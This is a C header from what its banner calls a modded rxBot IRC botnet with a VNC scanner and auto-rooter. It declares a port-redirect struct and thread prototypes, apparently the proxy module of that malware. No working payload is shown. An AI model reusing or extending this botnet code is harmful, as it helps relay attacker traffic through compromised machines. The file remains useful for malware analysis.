/*

    ri0t r00t b0t by h1t3m of h1t3m.org | h4cky0u.org

     (rxBot MP modded with vnc scanner / auto-r00ter)

*/


#ifndef NO_REDIRECT
// redirect structure.
typedef struct REDIRECT 
{
	SOCKET sock;
	SOCKET csock;
	char dest[MAXHOSTNAME];
	char chan[MAXCHANLEN];
	unsigned short port;
	unsigned short lport;
	int threadnum;
	int cthreadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;
	BOOL cgotinfo;

} REDIRECT;

DWORD WINAPI RedirectThread(LPVOID param);
DWORD WINAPI RedirectLoopThread(LPVOID param);
DWORD WINAPI RedirectLoop2Thread(LPVOID param);
#endif
